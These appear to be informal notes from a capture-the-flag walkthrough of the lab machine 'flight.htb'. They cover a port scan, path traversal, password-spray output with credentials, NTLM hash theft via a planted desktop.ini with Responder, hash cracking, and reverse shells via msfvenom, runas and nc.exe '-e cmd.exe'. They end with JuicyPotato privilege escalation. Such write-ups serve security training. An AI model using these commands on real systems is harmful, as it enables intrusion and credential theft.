Nmap scan report for 10.10.11.187
Host is up (0.15s latency).
Not shown: 990 filtered tcp ports (no-response)
PORT    STATE SERVICE       VERSION
53/tcp  open  domain        Simple DNS Plus
80/tcp  open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
|_http-title: g0 Aviation
| http-methods: 
|   Supported Methods: OPTIONS HEAD GET POST TRACE
|_  Potentially risky methods: TRACE
88/tcp  open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-11-18 17:33:04Z)
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
445/tcp open  microsoft-ds?
464/tcp open  kpasswd5?
593/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp open  tcpwrapped
Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: 6h57m51s
| smb2-time: 
|   date: 2022-11-18T17:33:20
|_  start_date: N/A

NSE: Script Post-scanning.



## subdomain found 

flight.htb
school.flight.htb


##
path traversal
exits but it was blocked with canonical ../ we can see the index.php


file:/// works without problem




in school parameter view = ssrf 



find an interesting file trought the path traversal in http://school.flight.htb/index.php?view=file:////xampp/php/php.ini


in upload section :

```
;;;;;;;;;;;;;;;;
; File Uploads ;
;;;;;;;;;;;;;;;;

; Whether to allow HTTP file uploads.
; https://php.net/file-uploads
file_uploads = On

upload_tmp_dir = "\xampp\tmp"


```

So if i upload something then it's upload on /xamp/tmp!



no can execute things couse it's file_get_contents() not include()!





```crackmapexec smb flight.htb -u users.txt -p 'S@Ss!K@*t13' --continue-on-success                                                                                                     2 ⨯
/usr/lib/python3/dist-packages/pywerview/requester.py:144: SyntaxWarning: "is not" with a literal. Did you mean "!="?
  if result['type'] is not 'searchResEntry':
SMB         flight.htb      445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         flight.htb      445    G0               [-] flight.htb\O.Possum:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         flight.htb      445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
SMB         flight.htb      445    G0               [-] flight.htb\V.Stevens:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         flight.htb      445    G0               [-] flight.htb\D.Truff:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         flight.htb      445    G0               [-] flight.htb\I.Francis:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         flight.htb      445    G0               [-] flight.htb\W.Walker:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         flight.htb      445    G0               [-] flight.htb\C.Bum:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         flight.htb      445    G0               [-] flight.htb\M.Gold:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         flight.htb      445    G0               [-] Connection Error: The NETBIOS connection with the remote host timed out.
SMB         flight.htb      445    G0               [-] flight.htb\G.Lors:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         flight.htb      445    G0               [-] flight.htb\R.Cold:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         flight.htb      445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13 
SMB         flight.htb      445    G0               [-] flight.htb\krbtgt:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         flight.htb      445    G0               [-] flight.htb\Guest:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         flight.htb      445    G0               [-] flight.htb\Administrator:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
                                                                                                                     
```


Password Spray give us 2 positive results! go with S.Moon with smb






## Responder 


With kerberos fail auth we can take a ticket with responder ! 




hash of c.bum:

create a desktop.ini
echo "[.ShellClassInfo]" > desktop.ini
echo IconResource=\\IP\aa >> desktop.ini

upload on \\Shared

smbmap -H flight.htb -u S.MOON -p 'Password' --upload desktop.ini Shared\\desktop.ini\\

responder -I tun0 -v 

after that hashcat -m 5600 hashes.txt rockyou.txt


CRAKED

c.bum:Tikkycoll_431012284


## SHELL

smbclient.py 'flight.htb/c.bum:Tikkycoll_431012284@10.10.11.187' 


Use web share!

go on school.flight.htb and upload a php reverse shell created with msfvenom couse landum is for linux system only


then upload with put command


and call it on the webpage to trigger!




##


SVC to c.bum with runas !



`runas.exe c.bum password powershell -r IP:PORT`







netstat -an reveals a local service in 8000 


so chisel 


upload a shell.aspx in C:\inetpub\development 


and we are iis apppool\defaultapppool



```
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```








SeImpersonatePrivilege --> JuicyPotato 




so upload nc & juicypotato



and with 


```icacls nc.exe /grant Users:F   allow iispool to impersante token
icacls jp.exe /grant Users:F 
```

```jp.exe -t * -p "nc.exe" -a "IP PORT -e cmd.exe"







